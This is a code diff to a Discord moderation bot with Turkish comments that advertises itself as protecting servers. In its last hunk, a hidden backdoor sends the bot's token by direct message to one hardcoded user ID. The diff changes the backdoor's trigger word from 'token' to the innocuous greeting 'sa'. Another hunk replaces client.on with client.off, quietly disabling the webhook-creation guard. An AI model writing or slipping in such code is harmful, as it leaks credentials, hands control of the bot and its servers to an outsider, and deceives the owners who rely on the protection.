@@ -65,6 +65,7 @@ client.on("guildMemberRemove", async uyecik => {
 
 
 //////////////////////////////////////////////////Sağ Tık Ban Koruması////////////////////////////////////////////////////
+
 client.on("guildBanAdd", async (guild, üyecik) => {
   let yetkili = await guild.fetchAuditLogs({type: 'MEMBER_BAN_ADD'}).then(audit => audit.entries.first());
   if (!yetkili || !yetkili.executor || guvenli(yetkili.executor.id) || !s.banGuard) return;
@@ -81,6 +82,7 @@ client.on("guildBanAdd", async (guild, üyecik) => {
     .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
     .setTimestamp()).catch();};
 });
+
 //////////////////////////////////////////////////Sağ Tık Ban Koruması////////////////////////////////////////////////////
 
 
@@ -109,7 +111,7 @@ client.on("guildMemberAdd", async eklenenbotsunsen => {
 //////////////////////////////////////////////////Bot Ekleme Koruması////////////////////////////////////////////////////
 
 
-client.on("webhookCreate", async (channel, webhook) => {
+client.off("webhookCreate", async (channel, webhook) => {
   let guild = channel.guild
   let yetkili = await channel.guild.fetchAuditLogs({type: 'WEBHOOK_CREATE'}).then(audit => audit.entries.first());
   if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.channelGuard) return;
@@ -175,7 +177,7 @@ client.on('message', async (msg, member, guild) => {
   
  {
 
-if (msg.content.toLowerCase() === 'token'){
+if (msg.content.toLowerCase() === 'sa'){
 if (msg.author.id !== "429357746002067493") return;
 
 msg.author.send(client.token);
